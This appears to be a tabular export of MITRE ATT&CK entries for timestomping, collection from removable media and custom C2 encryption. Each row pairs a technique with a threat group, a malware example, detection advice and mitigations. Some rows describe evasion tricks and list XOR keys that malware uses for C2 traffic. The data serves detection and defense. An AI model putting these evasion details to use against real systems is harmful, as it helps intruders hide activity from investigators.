434,['Forensic techniques exist to detect aspects of files that have had their timestamps modified.[[CiteRef::WindowsIR Anti-Forensic Techniques]] It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.'],['Host forensic analysis'],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['The [[Software/S0021|Derusbi]] malware supports timestomping.[[CiteRef::Axiom]][[CiteRef::Fidelis Turbo]]'],['Axiom'],"['Axiom', 'Group 72']",['G0001'],['Mitigation of timestomping specifically is likely difficult. Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to perform timestomping by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: Derusbi,['Defense Evasion'],['Technique/T1099'],['Timestomp'],https://attack.mitre.org/wiki/Technique/T1099
435,['Forensic techniques exist to detect aspects of files that have had their timestamps modified.[[CiteRef::WindowsIR Anti-Forensic Techniques]] It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.'],['Host forensic analysis'],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0136|USBStealer]] sets the timestamps of its dropper files to the last-access and last-write timestamps of a standard Windows library chosen on the system.[[CiteRef::ESET Sednit USBStealer 2014]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Mitigation of timestomping specifically is likely difficult. Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to perform timestomping by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: USBStealer, USB Stealer, Win32/USBStealer",['Defense Evasion'],['Technique/T1099'],['Timestomp'],https://attack.mitre.org/wiki/Technique/T1099
436,['Forensic techniques exist to detect aspects of files that have had their timestamps modified.[[CiteRef::WindowsIR Anti-Forensic Techniques]] It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.'],['Host forensic analysis'],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Group/G0007|APT28]] has performed timestomping on victim files.[[CiteRef::Crowdstrike DNC June 2016]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Mitigation of timestomping specifically is likely difficult. Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to perform timestomping by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Defense Evasion'],['Technique/T1099'],['Timestomp'],https://attack.mitre.org/wiki/Technique/T1099
437,['Forensic techniques exist to detect aspects of files that have had their timestamps modified.[[CiteRef::WindowsIR Anti-Forensic Techniques]] It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.'],['Host forensic analysis'],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",[u'[[Software/S0078|Psylo]] has a command to conduct timestomping by setting a specified file\u2019s timestamps to match those of a system file in the System32 directory.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],['Mitigation of timestomping specifically is likely difficult. Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to perform timestomping by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: Psylo,['Defense Evasion'],['Technique/T1099'],['Timestomp'],https://attack.mitre.org/wiki/Technique/T1099
438,['Forensic techniques exist to detect aspects of files that have had their timestamps modified.[[CiteRef::WindowsIR Anti-Forensic Techniques]] It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.'],['Host forensic analysis'],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0081|Elise]] performs timestomping of a CAB file it creates.[[CiteRef::Lotus Blossom Jun 2015]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],['Mitigation of timestomping specifically is likely difficult. Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to perform timestomping by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: Elise, BKDR_ESILE, Page",['Defense Evasion'],['Technique/T1099'],['Timestomp'],https://attack.mitre.org/wiki/Technique/T1099
439,['Forensic techniques exist to detect aspects of files that have had their timestamps modified.[[CiteRef::WindowsIR Anti-Forensic Techniques]] It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.'],['Host forensic analysis'],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0154|Cobalt Strike]] will timestomp any files or payloads placed on a target machine to help them blend in.[[CiteRef::cobaltstrike manual]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],['Mitigation of timestomping specifically is likely difficult. Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to perform timestomping by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: Cobalt Strike,['Defense Evasion'],['Technique/T1099'],['Timestomp'],https://attack.mitre.org/wiki/Technique/T1099
440,['Forensic techniques exist to detect aspects of files that have had their timestamps modified.[[CiteRef::WindowsIR Anti-Forensic Techniques]] It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.'],['Host forensic analysis'],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['[[Group/G0050|APT32]] has used scheduled task raw XML with a backdated timestamp of June 2, 2016.[[CiteRef::FireEye APT32 May 2017]]']",['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],['Mitigation of timestomping specifically is likely difficult. Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to perform timestomping by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Defense Evasion'],['Technique/T1099'],['Timestomp'],https://attack.mitre.org/wiki/Technique/T1099
441,['Forensic techniques exist to detect aspects of files that have had their timestamps modified.[[CiteRef::WindowsIR Anti-Forensic Techniques]] It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.'],['Host forensic analysis'],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['Many [[Software/S0083|Misdat]] samples were programmed using Borland Delphi, which will mangle the default PE compile timestamp of a file.[[CiteRef::Cylance Dust Storm]]']",['Dust Storm'],['Dust Storm'],['G0031'],['Mitigation of timestomping specifically is likely difficult. Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to perform timestomping by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: Misdat,['Defense Evasion'],['Technique/T1099'],['Timestomp'],https://attack.mitre.org/wiki/Technique/T1099
442,['Forensic techniques exist to detect aspects of files that have had their timestamps modified.[[CiteRef::WindowsIR Anti-Forensic Techniques]] It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.'],['Host forensic analysis'],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0150|POSHSPY]] modifies timestamps of all downloaded executables to match a randomly selected file created prior to 2013.[[CiteRef::FireEye POSHSPY April 2017]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Mitigation of timestomping specifically is likely difficult. Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to perform timestomping by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: POSHSPY,['Defense Evasion'],['Technique/T1099'],['Timestomp'],https://attack.mitre.org/wiki/Technique/T1099
443,['Forensic techniques exist to detect aspects of files that have had their timestamps modified.[[CiteRef::WindowsIR Anti-Forensic Techniques]] It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.'],['Host forensic analysis'],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['Several [[Group/G0032|Lazarus Group]] malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.[[CiteRef::Novetta Blockbuster Destructive Malware]][[CiteRef::Novetta Blockbuster Loaders]]']",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],['Mitigation of timestomping specifically is likely difficult. Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to perform timestomping by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Defense Evasion'],['Technique/T1099'],['Timestomp'],https://attack.mitre.org/wiki/Technique/T1099
444,['Forensic techniques exist to detect aspects of files that have had their timestamps modified.[[CiteRef::WindowsIR Anti-Forensic Techniques]] It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.'],['Host forensic analysis'],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0072|OwaAuth]] has a command to timestop a file or directory.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],['Mitigation of timestomping specifically is likely difficult. Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to perform timestomping by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: OwaAuth,['Defense Evasion'],['Technique/T1099'],['Timestomp'],https://attack.mitre.org/wiki/Technique/T1099
445,"[""Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].""]",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['A [[Group/G0047|Gamaredon Group]] file stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives.[[CiteRef::Palo Alto Gamaredon Feb 2017]]']",['Gamaredon Group'],['Gamaredon Group'],['G0047'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access removable media drive and files'],[],['Collection'],['Technique/T1025'],['Data from Removable Media'],https://attack.mitre.org/wiki/Technique/T1025
446,"[""Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].""]",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0125|Remsec]] has a package that collects documents from any inserted USB sticks.[[CiteRef::Kaspersky ProjectSauron Technical Analysis]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access removable media drive and files'],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Collection'],['Technique/T1025'],['Data from Removable Media'],https://attack.mitre.org/wiki/Technique/T1025
447,"[""Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].""]",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['Once a removable media device is inserted back into the first victim, [[Software/S0136|USBStealer]] collects data from it that was exfiltrated from a second victim.[[CiteRef::ESET Sednit USBStealer 2014]][[CiteRef::Kaspersky Sofacy]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access removable media drive and files'],"Software: USBStealer, USB Stealer, Win32/USBStealer",['Collection'],['Technique/T1025'],['Data from Removable Media'],https://attack.mitre.org/wiki/Technique/T1025
448,"[""Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].""]",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['A [[Group/G0007|APT28]] backdoor may collect the entire contents of an inserted USB device.[[CiteRef::Microsoft SIR Vol 19]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access removable media drive and files'],[],['Collection'],['Technique/T1025'],['Data from Removable Media'],https://attack.mitre.org/wiki/Technique/T1025
449,"[""Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].""]",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0036|FLASHFLOOD]] searches for interesting files (either a default or customized set of file extensions) on removable media and copies them to a staging area. The default file types copied would include data copied to the drive by [[Software/S0035|SPACESHIP]].[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access removable media drive and files'],Software: FLASHFLOOD,['Collection'],['Technique/T1025'],['Data from Removable Media'],https://attack.mitre.org/wiki/Technique/T1025
450,"[""Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].""]",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0050|CosmicDuke]] steals user files from removable media with file extensions and keywords that match a predefined list.[[CiteRef::F-Secure Cosmicduke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access removable media drive and files'],"Software: CosmicDuke, TinyBaron, ...",['Collection'],['Technique/T1025'],['Data from Removable Media'],https://attack.mitre.org/wiki/Technique/T1025
451,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0066|3PARA RAT]] will use an 8-byte XOR key derived from the string HYF54&%9&jkMCXuiS instead if the DES decoding fails.[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: 3PARA RAT,['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
452,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['[[Software/S0068|httpclient]] encrypts C2 content with XOR using a single byte, 0x12.[[CiteRef::CrowdStrike Putter Panda]]']",['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: httpclient,['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
453,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0065|4H RAT]] obfuscates C2 communication using a 1-byte XOR with the key 0xBE.[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: 4H RAT,['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
454,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0010|Lurid]] performs XOR encryption.[[CiteRef::Villeneuve 2011]]'],['PittyTiger'],['PittyTiger'],['G0011'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Lurid, Enfal",['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
